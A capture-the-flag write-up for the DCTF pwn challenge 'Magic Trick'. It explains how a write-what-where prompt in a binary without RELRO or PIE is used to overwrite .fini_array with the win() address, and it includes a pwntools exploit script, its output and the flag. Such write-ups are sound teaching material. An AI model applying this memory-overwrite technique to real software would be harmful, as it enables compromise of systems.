## Magic Trick (300 Points)

### Problem  
```  
How about a magic trick?  
nc dctf-chall-magic-trick.westeurope.azurecontainer.io 7481

File: magic_trick  
```

### Solution  
Let me start by saying, I think I solved this chall by blind luck of stumbling
on a writeup for a similar style Pwn challenge.

Anyway, firstly, I ran `checksec` to see what I was dealing with.

```  
❯ pwn checksec magic_trick  
[*] '~/ctf/dctf/magic_trick'  
   Arch:     amd64-64-little  
   RELRO:    No RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

I opened the binary in Ghidra and inspected the important functions -
`main()`, `magic()`, and `win()`.

We need to get from `magic()` to `win()` without any overflows this time.

We're prompted twice for input - something to write, and a place to write it.
I'm not really sure where to go with this so I do some searching of old CTF
writeups to see if I can see anything similar.

```c  
puts("What do you want to write");  
__isoc99_scanf(&DAT_00400823,&local_28);  
puts("Where do you want to write it");  
__isoc99_scanf(&DAT_00400823,&local_20);  
```

I came across [this
writeup](https://github.com/guyinatuxedo/ctf/tree/master/tokyowesterns16/pwn/greeting)
where the author is prompted for input and there's a bunch of pointers with no
way to overflow. The author mentions that as the binary is not RELRO enabled,
they can write to the GOT Table and as PIE isn't enabled, they can see the
addresses of the GOT table. We're in the same scenario!

The author eventually goes on to mention that as a buffer overflow isn't
possible due to `__stack_chk_fail()`, they can instead write to `.fini_array`.

So, with that, I went and got the address of `.fini_array` in Ghidra
(`0x00600a00`), and then I went and got the address of `win()` in
Ghidra(`0x00400667`).

The program asks us what we write, and where we want to write it - it kind of
makes sense to me to write the `win()` address to the `.fini_array` address.  
Let's write some Python to do that for us...

```python  
from pwn import *

host = remote('dctf-chall-magic-trick.westeurope.azurecontainer.io', 7481)

win_addr = str(0x00400667)  
fini_addr = str(0x00600a00)

host.recv()  
host.sendline(win_addr)  
host.recv()  
host.sendline(fini_addr)

host.interactive()  
```

```  
❯ python3 exploit.py  
[+] Opening connection to dctf-chall-magic-trick.westeurope.azurecontainer.io
on port 7481: Done  
[*] Switching to interactive mode  
thanks  
You are a real magician  
dctf{1_L1k3_M4G1c}  
[*] Got EOF while reading in interactive  
$  
```

On one hand I'm glad I got the flag here, but I don't fully understand **why**
this was the right thing to do. It's something I'll build on in the next few
CTFs, I'm sure.

Flag: `dctf{1_L1k3_M4G1c}`  

Original writeup
(https://github.com/cieran/writeups/blob/main/DragonCTF/pwn/MagicTrick.md).